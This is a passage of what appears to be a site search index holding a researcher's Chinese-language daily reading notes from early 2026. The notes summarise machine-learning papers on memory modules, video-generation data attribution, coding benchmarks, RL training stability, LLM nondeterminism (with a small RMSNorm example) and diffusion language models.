Hash\uff0c\u6700\u540e\u62fc\u63a5\u6210\u4e00\u4e2a\u8bb0\u5fc6\u5411\u91cf\uff0c\u540e\u9762\u8fc7\u4e00\u4e2aContext-Aware Gating</li> </ul> </li> </ul> <p>\u5728\u76f8\u540c\u7684\u53c2\u6570\u9884\u7b97\u4e0b\uff0cMoe\u53c2\u6570\u548cEngram\u6240\u5360\u5185\u5b58\u4e4b\u95f4\u5b58\u5728U\u5f62\u66f2\u7ebf\u7684\u5151\u6362\u5173\u7cfb</p> <p></p> <p>\u5e76\u4e14\u5728\u63a8\u7406\u8fc7\u7a0b\u4e2d\uff0cEngram\u53ef\u4ee5\u505a\u5230\u5b58\u7b97\u5206\u79bb\uff0cEngram\u6a21\u5757\u7684\u8ba1\u7b97\u548c\u4e2d\u95f4\u5c42\u7684\u8f93\u51fa\u65e0\u5173\uff0c\u4ec5\u4ec5\u548c\u8f93\u5165\u7684token\u5e8f\u5217\u6709\u5173\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u5c06Engram\u6a21\u5757\u7684\u8ba1\u7b97\u548cTransformer-Block\u7684\u8ba1\u7b97\u89e3\u8026\u5f00\uff0c\u5e76\u4e14\u6b64\u79cd\u65b9\u6848\u53ef\u4ee5\u6709\u6548\u5229\u7528CPU\u5185\u5b58</p> <p></p> <ul> <li>Motion Attribution for Video Generation<ul> <li>nvidia\u7684\u8bba\u6587\uff0c\u8bad\u7ec3\u6570\u636e\u4e2d\u7684\u89c6\u9891\u5982\u4f55\u5f71\u54cd\u89c6\u9891\u751f\u6210\u6a21\u578b\u4e2d\u7684\u8fd0\u52a8\u8f93\u51fa\uff0c\u56e0\u4e3aImage\u751f\u6210\u6a21\u578b\u5df2\u7ecf\u505a\u5f97\u975e\u5e38\u4f18\u79c0\uff0c\u4eba\u4eec\u5f80\u5f80\u81f4\u529b\u4e8e\u5c06Image Model\u7684\u4e00\u4e9b\u505a\u6cd5\u8fc1\u79fb\u8fc7\u6765\uff0c\u5305\u62ec\u5bf9\u4e8e\u7eb9\u7406\uff0c\u8272\u5f69\u7b49\u5185\u5bb9\u7684\u4f18\u5316\u3002\u4f46\u662f\u8fd9\u4e9b\u8fc7\u7a0b\u5f80\u5f80\u5ffd\u7565\u4e86\u89c6\u9891\u751f\u6210\u6a21\u578b\u6700\u4e3a\u72ec\u7279\u7684\u5185\u5bb9\uff0c\u8fd0\u52a8\uff0c\u8fd0\u52a8\u548c\u65f6\u95f4\u6d41\u52a8\u7d27\u5bc6\u8054\u7cfb\uff0c\u662f\u89c6\u9891\u751f\u6210\u6a21\u578b\u6700\u91cd\u8981\u7684\u7279\u70b9</li> <li>\u6838\u5fc3\u662f\u63d0\u4f9b\u4e86\u4e00\u79cd\u6570\u636e\u7b5b\u9009\u7684\u65b9\u6848\uff0c\u6765\u4f7f\u5f97\u8bad\u7ec3\u7684\u6a21\u578b\u6709\u66f4\u597d\u7684\u8fd0\u52a8\u4e00\u81f4\u6027</li> </ul> </li> </ul> <p>Data Attribution</p> <p>\u8fd9\u4e2a\u662f\u6570\u636e\u5904\u7406\u9886\u57df\u7684\u4e00\u4e2a\u6982\u5ff5\uff0c\u7528\u4e8e\u7814\u7a76\u6bcf\u6761\u6570\u636e\u5bf9\u4e8e\u6a21\u578b\u8bad\u7ec3\u5e26\u6765\u7684\u5f71\u54cd\uff0c\u8fd9\u4e2a\u9886\u57df\u7684\u53d1\u5c55\u5927\u6982\u6709\u8fd9\u4e9b\u9636\u6bb5</p> <ul> <li>Ex-DL\u65f6\u4ee3\uff0c\u524dDL\u65f6\u4ee3\uff0c\u6a21\u578b\u8f83\u5c0f\uff0c\u53ef\u4ee5\u7528\u6bcf\u6b21\u66f4\u65b0\u4e4b\u540e\u6a21\u578b\u5bf9\u4e8e\u6d4b\u8bd5\u96c6\u7684\u53d8\u5316\uff08\u8fd9\u91cc\u9700\u8981\u4e00\u4e2aInfluence Functions\uff09\u6765\u8861\u91cf\uff0c\u8fd9\u4e00\u6b65\u9700\u8981\u77e9\u9635\u6c42\u9006\uff0c\u5728\u73b0\u4ee3DL\u6a21\u578b\u4e0b\u65f6\u6548</li> <li>\u73b0\u4ee3DL\u65b9\u6848\uff0c\u4f1a\u7528\u7c7b\u4f3cTracIN\uff0cTRAK\u7684\u65b9\u6cd5\u6765\u8fd1\u4f3c\u6570\u636e\u5f71\u54cd\u7684\u8ba1\u7b97</li> <li>Diffusion Model\uff1a\u5bf9\u4e8eDiffusion Model\u7684\u8861\u91cf\u548c\u5176\u4ed6\u65b9\u6848\u6709\u4e9b\u5dee\u5f02\uff0c\u56e0\u4e3aDiffusion\u4e0d\u540c\u65f6\u95f4\u6b65\u6709\u4e0d\u540c\u7684\u8868\u73b0\uff0c\u56e0\u6b64\u9700\u8981norm</li> </ul> <p></p> <p>\u800c\u8fd9\u4e9b\u65b9\u6848\u5bf9\u4e8eVideo diffusion\u9886\u57df\u90fd\u5931\u6548\u4e86\uff0c\u4f20\u7edf\u7684Diffusion Data Attribution\u7684\u65b9\u6cd5\u4f1a\u5bfc\u81f4\u5176\u5173\u6ce8\u5916\u5f62\u800c\u4e0d\u662f\u52a8\u4f5c\uff0c\u5e76\u4e14\u5728Long Video\u4e0b\u8ba1\u7b97\u5f00\u9500\u4e5f\u4f1a\u6269\u5927\uff0c\u8fd9\u4e5f\u662f\u8fd9\u7bc7\u8bba\u6587\u7684\u6838\u5fc3\u8d21\u732e</p> <p>\u5176\u505a\u6cd5\u662f\uff0c\u9996\u5148\u6211\u4eec\u6709\u4e2aquery data\uff0c\u8fd9\u662f\u6211\u4eec\u60f3\u8981\u4f18\u5316\u7684\u4e00\u4e2a\u52a8\u4f5c\uff0c\u6bd4\u5982\u662f\u6f02\u6d6e\u8fd9\u4e2a\u73b0\u8c61\uff0c\u6211\u4eec\u8981\u6839\u636e\u8fd9\u4e2a\u73b0\u8c61\u53bb\u627e\u5230\u8bad\u7ec3\u6570\u636e\u96c6\u5408\u4e2d\u4e0e\u5176\u6b63\u76f8\u5173\u7684\u6570\u636e\uff0c\u90a3\u4e48\u600e\u4e48\u627e\u5462\uff0c\u5c31\u662f\u5bf9\u4e8e\u4e24\u4e2a\u89c6\u9891\u90fd\u6c42diffusion model\u7684\u68af\u5ea6\uff0c\u5148\u8ba1\u7b97MSE Loss\uff0c\u7136\u540e\u5bf9\u8fd9\u4e2aLoss\u8fdb\u884c\u4e00\u4e2a\u8fd0\u52a8\u7684Mask\u906e\u7f69\uff0c\u540e\u7eed\u7684\u68af\u5ea6\u8ba1\u7b97\u4e2d\u53ea\u5173\u5fc3\u6b63\u5728\u8fd0\u52a8\u7684\u7269\u4f53\uff0c\u8fd9\u6837\u5b50\u8ba1\u7b97\u51fa\u6765\u7684\u68af\u5ea6\u5c31\u662f\u548c\u8fd0\u52a8\u76f8\u5173\u7684\uff0c\u7136\u540e\u518d\u628a\u8fd9\u4e24\u90e8\u5206\u7684\u68af\u5ea6\uff0c\u8ba1\u7b97\u76f8\u4f3c\u5ea6\uff0c\u5c31\u53ef\u4ee5\u5f97\u51fa\u76f8\u5e94\u7684\u6b63\u8d1f\u6548\u679c</p> <p></p> <p></p>"},{"location":"reading/dailyreading/2026-1/#115","title":"1.15","text":"<ul> <li>OctoCodingBench<ul> <li>MiniMax\u53d1\u5e03\u7684\u65b0\u7684\u5173\u4e8eCoding\u7684Bench\uff0c\u662f\u4e00\u4e2a\u975e\u5e38\u8be6\u5c3d\u7684\u8fc7\u7a0b\u76d1\u7763\u7684Benchmark\uff0c\u4f1a\u76d1\u7763\u6a21\u578b\u5728\u89e3\u51b3Coding\u4efb\u52a1\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6709\u6ca1\u6709\u9075\u4ece\u7528\u6237\u6307\u793a\uff0c\u4e0d\u6b62\u5173\u6ce8\u6700\u7ec8\u7684\u6d4b\u8bd5\u662f\u5426\u901a\u8fc7</li> </ul> </li> </ul> <ul> <li>MemGovern<ul> <li>\u7ecf\u9a8c\u5e93+Code Agent\uff0c\u5e0c\u671bCode Agent\u5728\u6267\u884c\u7f16\u7a0b\u4efb\u52a1\u7684\u65f6\u5019\uff0c\u80fd\u591f\u53c2\u8003\u4e00\u4e9b\u4eba\u7c7b\u7684\u6210\u529f\u7ecf\u9a8c\u6765\u63d0\u9ad8\u6210\u529f\u7387\uff0c\u6807\u8bb0\u4e86130+k\u4eceGithub\u7684\u83b7\u53d6\u7684\u6210\u529f\u7ecf\u9a8c\u4f5c\u4e3aCode Agent\u7684\u7ecf\u9a8c\u5e93\uff0c\u4f46\u662f\u611f\u89c9\u6da8\u70b9\u4e0d\u662f\u5f88\u9ad8</li> <li>\u4e2a\u4eba\u8ba4\u4e3a\u4f5c\u4e3a\u7f16\u7a0b\u8f85\u52a9\u7684\u5de5\u5177\u7684\u8bdd\uff0c\u5982\u679cCode Agent\u5728\u65e0\u6cd5\u5904\u7406\u4efb\u52a1\u7684\u65f6\u5019\uff0c\u80fd\u591f\u5e2e\u6211\u4eceGithub\uff0cStackOverflow\u4e0a\u5e2e\u6211\u641c\u7d22\u76f8\u5173\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5e76\u4e14\u5217\u51fa\u6765\u7ed9\u6211\u770b\uff0c\u8fd9\u4e2a\u662f\u4e00\u4e2a\u6211\u4f1a\u6bd4\u8f83\u559c\u6b22\u7684\u529f\u80fd</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-1/#116","title":"1.16","text":"<ul> <li>https://arxiv.org/pdf/2601.10355<ul> <li>\u7f8e\u56e2\u7684Paper\uff0c\u4e00\u4e2a\u4ece\u771f\u5b9e\u6570\u636e\u4e2d\u5408\u6210\u5e26\u5de5\u5177\u8c03\u7528\u7684\u8bad\u7ec3\u7684pipeline\uff0c\u7528\u4e8e\u63d0\u5347Agent\u80fd\u529b</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-1/#121","title":"1.21","text":"<ul> <li> <p>https://arxiv.org/pdf/2601.08521</p> <ul> <li>\u8fd9\u7bc7\u8bba\u6587\u7cfb\u7edf\u8bba\u8ff0\u4e86GRPO\u53ca\u5176\u53d8\u4f53\u4e2d\u7684bias\uff0c\u5176\u6548\u679c\u5bfc\u81f4\u5728rollout\u6570\u91cf\u4e0d\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cGRPO\u5bf9\u4e8e\u4f4e\u96be\u5ea6\u7684Prompt\u8fc7\u5ea6\u5229\u7528\uff0c\u5e76\u4e14\u5bf9\u4e8e\u9ad8\u96be\u5ea6\u7684Prompt\u6ca1\u6709\u5145\u5206\u7684\u63a2\u7d22</li> </ul> </li> <li> <p>Sparse RL</p> <ul> <li>\u5c06KV-cache\u538b\u7f29\u6280\u672f\u7eb3\u5165\u5230RL\u7684\u6846\u67b6\u4e2d\uff0c\u505a\u4e86\u4e00\u4e9b\u4fee\u6b63\u63aa\u65bd\uff0c\u6765\u4fdd\u8bc1\u8bad\u7ec3\u7684\u7a33\u5b9a\u6027\uff0c\u4f46\u662f\u4e2a\u4eba\u611f\u89c9\u6709\u70b9tricky</li> <li>trick 1 \u5bf9\u4e8e\u7a00\u758f\u8ba1\u7b97\u548c\u7a20\u5bc6\u8ba1\u7b97\u5dee\u5f02\u8fc7\u5927\u7684rollout\uff0c\u9009\u62e9\u62d2\u7edd\u91c7\u6837</li> <li>trick 2 \u91cd\u65b0\u8c03\u6574\u91cd\u8981\u6027\u91c7\u6837\uff0c\u5c06\u7a00\u758f\u548c\u7a20\u5bc6\u7684\u52a0\u6743\u8fdb\u6765</li> </ul> </li> <li>Undeterminism in LLM<ul> <li>\u8fd9\u662f\u6765\u81eathinking machine\u7684\u4e00\u7bc7\u6709\u8da3\u7684\u6587\u7ae0\uff0c\u89e3\u91ca\u4e86\u5982\u4f55\u4eceLLM\u4e2d\u5f97\u5230\u4e00\u4e2a\u786e\u5b9a\u7684\u53ef\u590d\u73b0\u7684\u7ed3\u679c</li> <li>\u4eba\u4eec\u5f80\u5f80\u8ba4\u4e3a\u5c06LLM call\u7684temperature\u8c03\u6574\u4e3a0\u5c31\u53ef\u4ee5\u5c06LLM\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7a33\u5b9a\u7684\u6620\u5c04\uff0c\u4f46\u4e8b\u5b9e\u5e76\u975e\u5982\u6b64\uff0c\u4e4b\u524d\u4eba\u4eec\u5f80\u5f80\u5c06\u5176\u5f52\u56e0\u4e3a\u786c\u4ef6\u8ba1\u7b97\u7684\u4e00\u4e9b\u4e0d\u4e00\u81f4\u6027\uff0c\u6bd4\u5982\u5728\u786c\u4ef6\u8ba1\u7b97\u4e0a\uff0c\u6d6e\u70b9\u6570\u662f\u4e0d\u7b26\u5408\u7ed3\u5408\u5f8b\u7684</li> </ul> </li> </ul> <pre><code>(0.1 + 1e20) - 1e20\n&gt;&gt;&gt; 0\n0.1 + (1e20 - 1e20)\n&gt;&gt;&gt; 0.1\n</code></pre> <p>\u800c\u5728LLM\u91cc\u7684kernel\u8ba1\u7b97\u4e2d\uff0c\u53ef\u80fd\u4f1a\u5728\u6bcf\u6b21\u8c03\u7528\u4e2d\u51fa\u73b0\u52a0\u6cd5\u987a\u5e8f\u7684\u53d8\u5316\uff0c\u56e0\u4e3a\u5e76\u53d1\u7684\u7ebf\u7a0b\u7684\u5b8c\u6210\u65f6\u95f4\u662f\u65e0\u6cd5\u9884\u4f30\u7684\uff0c\u540e\u7eed\u7684\u7d2f\u52a0\u987a\u5e8f\u81ea\u7136\u4e5f\u65e0\u6cd5\u9884\u4f30\uff0c\u8fd9\u662f\u5f88\u81ea\u7136\u7684\u5047\u8bbe\uff08\u8fd9\u79cd\u6839\u636e\u7ebf\u7a0b\u6267\u884c\u5b8c\u6210\u7684\u987a\u5e8f\u6267\u884c\u7d2f\u52a0\u7684\u65b9\u6848\u79f0\u4e3a\u539f\u5b50\u52a0\u6cd5\uff09\u3002</p> <p>\u7136\u800c\u4e8b\u5b9e\u4e0a\u662f\uff0cLLM\u7684\u524d\u5411\u4e2d\u5176\u5b9e\u57fa\u672c\u4e0d\u5305\u542b\u8fd9\u79cd\u5f71\u54cd\u52a0\u6cd5\u987a\u5e8f\u7684\u65b9\u6848\uff0c\u90a3\u4e48\u6211\u4eec\u91cd\u65b0\u601d\u8003LLM\u7684\u4e0d\u786e\u5b9a\u6027\uff0c\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u7ed3\u8bba\u5c31\u662fLLM\u7684\u8f93\u51fa\u6536\u5230\u6279\u6b21\u7684\u5f71\u54cd</p> <p></p> <p>\u6211\u4eec\u7684\u63a8\u7406\u670d\u52a1\u5668\u53ef\u4ee5\u505a\u5230\u662f\u786e\u5b9a\u7684\uff0c\u4f46\u662f\u5176\u4ed6\u7528\u6237\u7684requests\uff0c\u5b9e\u9645\u4f1a\u5f71\u54cd\u5230\u4f60\u7684requests\uff0c\u770b\u4f3cLLM\u7684Kernel\u4e2d\u90fd\u53ef\u4ee5\u505a\u5230\u4e0d\u5b58\u5728\u539f\u5b50\u52a0\u6cd5\uff0c\u4f46\u662f\u5728Batch\u64cd\u4f5c\u4e0b\uff0c\u539f\u5b50\u52a0\u6cd5\u53c8\u91cd\u65b0\u51fa\u73b0\u4e86\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0cRMSNorm</p> <pre><code># x: [batch_size, hidden_dim]\n# weight: [hidden_dim]\ndef rms_norm(x, weight):\n    return x * torch.rsqrt(torch.mean(x ** 2, dim=-1, keepdim=True)) * weight\n</code></pre> <p>\u5f53\u6279\u6b21\u5f88\u5927\uff0c\u8d85\u8fc7GPU\u7684\u6838\u5fc3\u6570\u91cf\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba9\u6bcf\u4e2acore\u5904\u7406\u4e00\u4e2arequests\uff0c\u6b64\u65f6\u987a\u5e8f\u662f\u4e00\u81f4\u7684\uff0c\u4f46\u662f\u5f53\u6279\u6b21\u8f83\u5c11\u7684\u65f6\u5019\uff0c\u5de5\u7a0b\u5e08\u4eec\u4e3a\u4e86\u5145\u5206\u5229\u7528\u786c\u4ef6\u7cfb\u7edf\u7684\u6027\u80fd\uff0c\u4f1a\u8003\u8651\u62c6\u5206\u4e00\u4e2arequests\u5230\u4e0d\u540c\u7684core\u4e0a\u9762\uff0c\u6700\u540e\u5f15\u5165\u539f\u5b50\u52a0\u6cd5\uff0c\u4ece\u800c\u8fd9\u91cc\u4f1a\u5bfc\u81f4\u4e0d\u4e00\u81f4\u6027</p> <ul> <li>Inference Physics<ul> <li>Meta\u7684\u8bba\u6587\uff0c\u7528Training-Free\u7684\u65b9\u6848\uff0c\u589e\u52a0Video\u751f\u6210\u7684\u7269\u7406\u4e00\u81f4\u6027\uff0c\u7b97\u662fTest-time scaling\u5427\uff0c\u5229\u7528\u7684best-of-N\u4ee5\u53ca\u7528VJEPA Surprise\u505aScore Guidance</li> </ul> </li> </ul> <p></p> <ul> <li>https://dawning-road.github.io/blog/abc-bench<ul> <li>ABC Bench\uff0c\u65e8\u5728\u6784\u5efa\u771f\u5b9e\u540e\u7aef\u7cfb\u7edf\u4e2d\u8bc4\u6d4bAgent Coding\u80fd\u529b\u7684\u8bc4\u6d4b\u96c6\u5408</li> </ul> </li> </ul> <p></p> <ul> <li>Spatial Tree<ul> <li>\u8fd9\u7bc7\u5de5\u4f5c\u5f62\u5f0f\u5316\u4e86\u5bf9\u4e8e\u7a7a\u95f4\u667a\u80fd\u7684\u7406\u89e3\uff0c\u4e3b\u8981\u9488\u5bf9\u7684\u662f\u591a\u6a21\u6001\u7406\u89e3\u80fd\u529b\uff0c\u5176\u7528\u56db\u4e2a\u5c42\u7ea7\u6765\u63cf\u8ff0\u6a21\u578b\u7684\u7a7a\u95f4\u7406\u89e3\u80fd\u529b\uff0c\u5e76\u4e14\u5bf9\u6b64\u6784\u5efa\u4e86Benchmark</li> </ul> </li> </ul> <p></p>"},{"location":"reading/dailyreading/2026-1/#122","title":"1.22","text":"<ul> <li> <p>lr trick in RL</p> <ul> <li>\u8fd9\u662f\u4e00\u7bc7xAI\u7684\u5de5\u7a0b\u5e08\u7684\u535a\u5ba2\uff0c\u8fd9\u7bc7\u535a\u5ba2\u4e2d\u8bb2\u8ff0\u4e86\u9664\u4e86\u8bad\u63a8\u4e00\u81f4\u6027\u4ee5\u5916\u7684RL\u8bad\u7ec3\u5d29\u6e83\u7684\u539f\u56e0\u3002\u5bf9\u4e8e\u540c\u4e00\u6279\u6570\u636e\u8fdb\u884cRL\u7684\u65f6\u5019\uff0c\u7b80\u5355\u7684\u4fe1\u53f7\u5bb9\u6613\u88ab\u63d0\u524d\u83b7\u53d6\uff0c\u6b64\u65f6\u8fd9\u6279\u6570\u636e\u5bf9\u4e8e\u6a21\u578b\u800c\u8a00\uff0c\u4fe1\u53f7\u9010\u6e10\u51cf\u5f31\uff0c\u566a\u58f0\u9010\u6e10\u589e\u52a0\uff0c\u8fdb\u4e00\u6b65\u5bfc\u81f4\u4e86\u6a21\u578b\u5bb9\u6613\u51fa\u73b0\u8bad\u7ec3\u5d29\u6e83\u7684\u95ee\u9898</li> <li>\u4e4b\u524d\u4eba\u4eec\u5bf9\u4e8eRL\u8bad\u7ec3\u7a33\u5b9a\u6027\u7684\u5173\u6ce8\u70b9\u4e3b\u8981\u662f\u5728\u8bad\u63a8\u4e00\u81f4\u6027\u548c\u91cd\u8981\u6027\u91c7\u6837\u4e0a\u9762\uff0c\u4f46\u662f\u8fd9\u91cc\u6307\u51fa\u7684\u4fe1\u566a\u6bd4\u7684\u95ee\u9898\uff0c\u5f15\u5bfc\u5411\u57fa\u7840\u7684\u5b66\u4e60\u7387\u8c03\u6574\u7b56\u7565</li> </ul> </li> <li> <p>https://arxiv.org/abs/2601.14750</p> <ul> <li>Rot: Render of Cot \u8fd9\u7bc7\u5de5\u4f5c\u505a\u4e86\u6211\u4e4b\u524d\u60f3\u505a\u7684\u4e00\u4e2a\u4e8b\u60c5\uff0c\u5c06\u601d\u7ef4\u94fe\u7684\u8fc7\u7a0b\u7528\u56fe\u50cf\u8868\u793a\uff0c\u4e4b\u524d\u6709\u5f88\u591a\u7684\u5de5\u4f5c\u90fd\u662f\u5728\u8fde\u7eed\u7684\u7a7a\u95f4\u91cc\u9762\u505a\u63a8\u7406\uff0c\u4f46\u662f\u8fd9\u6837\u5c31\u5bfc\u81f4\u4e86\u63a8\u7406\u7684\u8fc7\u7a0b\u662f\u9ed1\u76d2\u3002</li> <li>\u8fd9\u7bc7\u6587\u7ae0\u7684\u8bad\u7ec3\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u4e00\u4e2a\u662f\u8bad\u7ec3\u4e00\u4e0b\u5bf9\u9f50\uff0c\u8ba9VLM\u4f1a\u8f93\u51fa\u8fde\u7eed\u5411\u91cf\uff0c\u5e76\u4e14\u4f5c\u4e3a\u76d1\u7763\u7684\u8f93\u51fa\u662f\u8f6c\u6362\u6210\u56fe\u50cf\u7684\u6587\u672c\u601d\u7ef4\u94fe\uff0c\u7b2c\u4e8c\u90e8\u5206\u662f\u6b63\u5f0f\u7684\u8bad\u7ec3\uff0c\u6b63\u5f0f\u7684\u8bad\u7ec3\u4e0d\u5bf9\u601d\u7ef4\u94fe\u505a\u76d1\u7763\uff0c\u53ea\u5bf9\u8f93\u51fa\u7684\u7ed3\u679c\u505a\u76d1\u7763</li> </ul> </li> </ul> <p></p> <p></p> <p>\u4f46\u662f\u6211\u4e2a\u4eba\u8ba4\u4e3a\u8fd9\u4e2a\u65b9\u6848\u505a\u5f97\u4e0d\u597d\uff0c\u56e0\u4e3a\u5b83\u7528\u7684\u662fVLM\u7684encoder\uff0c\u8fd9\u4e2aencoder\u6ca1\u6cd5\u505a\u91cd\u5efa\uff0c\u6240\u4ee5\u5176\u540c\u6837\u65e0\u6cd5\u5c06\u4e2d\u95f4\u7684Cot\u663e\u793a\u51fa\u6765\uff0c\u53ea\u80fd\u901a\u8fc7\u4e4b\u524d\u4e00\u4e9b\u4eba\u4eec\u5206\u6790image latent space\u7684\u65b9\u6848\u6765\u5206\u6790Cot\uff0c\u5e94\u8be5\u7528\u5177\u6709\u91cd\u5efa\u548c\u7406\u89e3\u80fd\u529b\u7684encoder\u624d\u5bf9\uff0c\u751a\u81f3\u6211\u89c9\u5f97\u73b0\u6709\u7684vision encoder\u672a\u5fc5\u9002\u5408\u8fd9\u4e2a\u4efb\u52a1\uff0c\u5e26\u91cd\u5efa\u548c\u63a8\u7406\u7684Loss\u91cd\u65b0\u8bad\u4e00\u4e2aencoder\u6216\u8bb8\u662f\u89e3\u6cd5</p>"},{"location":"reading/dailyreading/2026-1/#123","title":"1.23","text":"<ul> <li>https://dagroup-pku.github.io/ReVidgen.github.io/<ul> <li>\u5b57\u8282\u7684paper\uff0c\u5728\u5177\u8eab\u8fd9\u4e2a\u9886\u57df\u505avideo generation\u4efb\u52a1\u7684\u6d4b\u8bc4\uff0c\u5185\u90e8\u7684\u505a\u6cd5\u6216\u8bb8\u503c\u5f97\u6211\u4eec\u501f\u9274\uff0c\u5e76\u4e14\u4e5f\u5f00\u6e90\u7684\u6570\u636e\u96c6</li> </ul> </li> </ul> <ul> <li>JudgeRLVR<ul> <li>\u5c0f\u7c73\u7684\u8bba\u6587\uff0c\u8fd9\u7bc7\u8bba\u6587\u8ba4\u4e3a\u73b0\u5728\u7684RLVR\u5bfc\u81f4\u6a21\u578b\u7684\u63a2\u7d22\u8fc7\u591a\uff0c\u5bfc\u81f4\u751f\u6210\u5e8f\u5217\u5197\u957f\uff0c\u53ef\u4ee5\u7528\u4e24\u9636\u6bb5\u7684\u8bad\u7ec3\u65b9\u5f0f\uff0c\u7b2c\u4e00\u9636\u6bb5\u5148\u8bad\u7ec3\u6a21\u578b\u7684\u5224\u65ad\u80fd\u529b\uff0c\u7b2c\u4e8c\u9636\u6bb5\u518d\u8bad\u7ec3\u751f\u6210\uff0c\u80fd\u8ba9\u6a21\u578b\u5728\u63a2\u7d22\u7684\u65e9\u671f\u5c31\u5bf9\u591a\u6761\u63a2\u7d22\u8def\u5f84\u6709\u81ea\u5df1\u7684\u5224\u65ad\uff0c\u518d\u4e0d\u964d\u4f4e\u6b63\u786e\u7387\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u505a\u5230\u4f7f\u5f97\u751f\u6210\u5e8f\u5217\u66f4\u52a0\u7b80\u77ed</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-1/#126","title":"1.26","text":"<ul> <li>https://llm-in-sandbox.github.io/<ul> <li>\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f88\u5c0f\u7684\u4ec5\u67091.1GB\u7684\u901a\u7528\u8ba1\u7b97\u673a\u6c99\u76d2\uff0c\u4e3a\u4e00\u4e2aUbuntu\u7cfb\u7edf\uff0c\u901a\u8fc7\u8fd9\u4e00\u4e2a\u7cfb\u7edf\u7684\u63cf\u8ff0\uff0c\u5c31\u53ef\u4ee5\u5168\u65b9\u4f4d\u63d0\u9ad8LLM\u5728\u5404\u4e2abenchmark\u4e0a\u7684\u8868\u73b0\uff0c\u5c24\u5176\u662f\u5f3a\u6a21\u578b\u7684API\uff0c\u53ef\u4ee5\u5f88\u597d\u5730\u5728\u8fd9\u4e2a\u7cfb\u7edf\u4e0a\u505a\u4e0a\u4e0b\u6587\u5b66\u4e60</li> </ul> </li> <li>flexibility trap in diffusion llm<ul> <li>\u8fd9\u7bc7\u8bba\u6587\u5c55\u793a\u4e86Diffusion LLM\u58f0\u660e\u7684\u4efb\u610f\u987a\u5e8f\u751f\u6210\u7684\u4f18\u52bf\uff0c\u5176\u5b9e\u5728\u8bad\u7ec3\u7684\u65f6\u5019\u4f1a\u5f15\u5165\u95ee\u9898\uff0c\u4e00\u4e2a\u5408\u7406\u7684\u89e3\u91ca\u662f\u8fd9\u6837\u7684\uff0c\u4e25\u683c\u7684AR\u6a21\u578b\uff0c\u8ba9\u6a21\u578b\u5728\u751f\u6210\u4e2d\u76f4\u9762\u4e0d\u786e\u5b9a\u6027\uff0c\u56e0\u6b64\u4f1a\u6709\u4f4e\u7f6e\u4fe1\u5ea6\u7684token\u751f\u6210\uff0c\u4f46\u662f\u5728diffusion llm\u7684\u968f\u673a\u751f\u6210\u4e2d\uff0c\u6a21\u578b\u4f1a\u5b66\u4e60\u673a\u5236\u4f18\u5148\u751f\u6210\u7f6e\u4fe1\u5ea6\u66f4\u9ad8\u7684\u540e\u7eedtoken\uff0c\u800c\u901a\u8fc7\u8fd9\u4e9b\u751f\u6210\u7684\u524d\u540etoken\u7684\u53cc\u5411\u6ce8\u610f\u529b\u4e0b\uff0c\u4e2d\u95f4\u90a3\u4e2a\u672c\u8eab\u662f\u4f4e\u7f6e\u4fe1\u5ea6\u7684token\u6b64\u65f6\u7684\u63a2\u7d22\u7a7a\u95f4\u5c31\u88ab\u9650\u5236\u4e86</li> </ul> </li> </ul> <p>\u4e0a\u8ff0\u601d\u8def\u5bfc\u81f4\u7684\u7ed3\u679c\u5c31\u662f\uff0cdiffusion llm\u5728\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0cpass@k\u7684\u6027\u80fd\u4e0d\u5982ar\u6a21\u578b\uff0c\u770b\u4f3c\u81ea\u7531\u7684\u751f\u6210\u987a\u5e8f\u53cd\u800c\u9650\u5236\u4e86\u63a2\u7d22\u7a7a\u95f4</p> <p>\u663e\u7136\u8fd9\u4e00\u70b9\u5728RL\u4e2d\u81f3\u5173\u91cd\u8981\uff0c\u5728diffusion llm\u7684\u751f\u6210\u8def\u5f84\u4e0b\uff0c\u4e00\u4e9b\u5173\u952e\u7684high-entropy token\u7684entropy\u53cd\u800c\u662f\u4e0b\u964d\u4e86\uff0c\u4ece\u800c\u4e5f\u5c31\u5bfc\u81f4\u4e86\u5bf9\u4e8ediffusion llm\u7684rl\u6548\u679c\u4e0d\u4f73</p> <p></p> <p>\u5728\u8fd9\u7bc7\u8bba\u6587\u7684\u5b9e\u9a8c\u4e2d\uff0c\u5176\u5c06diffusion llm\u5728rl\u8bad\u7ec3\u4e2d\u4ecd\u7136\u4fdd\u6301ar\u7684\u751f\u6210\u987a\u5e8f\uff0c\u4f46\u662f\u5728\u63a8\u7406\u4e2d\u518d\u76d6\u7528\u4efb\u610f\u987a\u5e8f\u7684\u751f\u6210\u7ed3\u679c\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u4efb\u610f\u7684\u751f\u6210\u987a\u5e8f\u4e0d\u662f\u4efb\u4f55\u6548\u76ca\u90fd\u6ca1\u6709\uff0c\u5176\u5728pass@1\u7684\u6027\u80fd\u5f80\u5f80\u4f1a\u597d\u4e8e\u5176ar\u987a\u5e8f</p>"},{"location":"reading/dailyreading/2026-2/","title":"2026 2","text":""},{"location":"reading/dailyreading/2026-2/#23","title":"2.3","text":"<ul> <li>context learning bench<ul> <li>\u817e\u8baf\u53d1\u5e03\u7684\u4e00\u4e2abenchmark\uff0c\u5173\u4e8e\u6d4b\u8bc4\u6a21\u578b\u4e0a\u4e0b\u6587\u5b66\u4e60\u7684\u80fd\u529b\uff0c\u4e5f\u5373\u5728\u4e0a\u4e0b\u6587\u7eb3\u5165\u65b0\u7684\u77e5\u8bc6\u548c\u65b0\u7684\u89c4\u5219\uff0c\u770b\u6a21\u578b\u7684\u9075\u5faa\u7a0b\u5ea6</li> <li>\u6700\u9ad8\u5206\u6a21\u578b\u4e3aGPT 5.1 